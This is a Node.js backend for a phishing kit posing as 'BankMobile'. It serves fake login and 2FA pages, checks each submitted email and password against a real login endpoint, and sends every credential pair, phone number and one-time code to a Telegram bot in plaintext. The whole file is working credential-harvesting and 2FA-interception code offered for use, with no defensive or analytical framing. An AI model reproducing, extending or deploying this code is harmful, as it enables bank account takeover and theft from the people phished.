// ================================================
// BANKMOBILE - BACKEND (ONE MESSAGE ONLY)
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3004;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ================================================
// MIDDLEWARE
// ================================================
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured');
        return false;
    }
    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ================================================
// AUTHENTICATION
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);
        
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        const response = await axios.post('https://profile.refundselection.com/authenticate/login', 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );
        
        console.log(`Response status: ${response.status}`);
        
        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }
        
        console.log('❌ FAILED');
        return { success: false };
        
    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// LOGIN ENDPOINT - SINGLE MESSAGE ONLY
// ================================================
app.post('/authenticate', async (req, res) => {
    const { email, password } = req.body;
    
    console.log(`\n🔐 Login attempt: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        const successMsg = `✅ <b>SUCCESS!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ✅ VALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(successMsg);
        console.log('✅ VALID');
        res.json({ success: true });
    } else {
        const failMsg = `❌ <b>FAILED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ❌ INVALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(failMsg);
        console.log('❌ INVALID');
        res.json({ success: false, error: 'Invalid credentials' });
    }
});

// ================================================
// OTHER ENDPOINTS
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: <code>${phone}</code>`);
    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: <code>${otp}</code>`);
    res.json({ success: true });
});

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

// ================================================
// SERVE HTML FILES
// ================================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/error_verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'error_verify.html'));
});

app.get('/2FA.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2FA.html'));
});

app.get('/success.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   🔐 BANKMOBILE BACKEND                                     ║
║                                                               ║
║   📡 Server: http://localhost:${PORT}                          ║
║   📱 Frontend: http://localhost:${PORT}/index.html            ║
║   📨 TELEGRAM: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}
║                                                               ║
║   🔥 ONE MESSAGE ONLY:                                       ║
║   ✅ SUCCESS or ❌ FAILED with credentials                   ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
    `);
});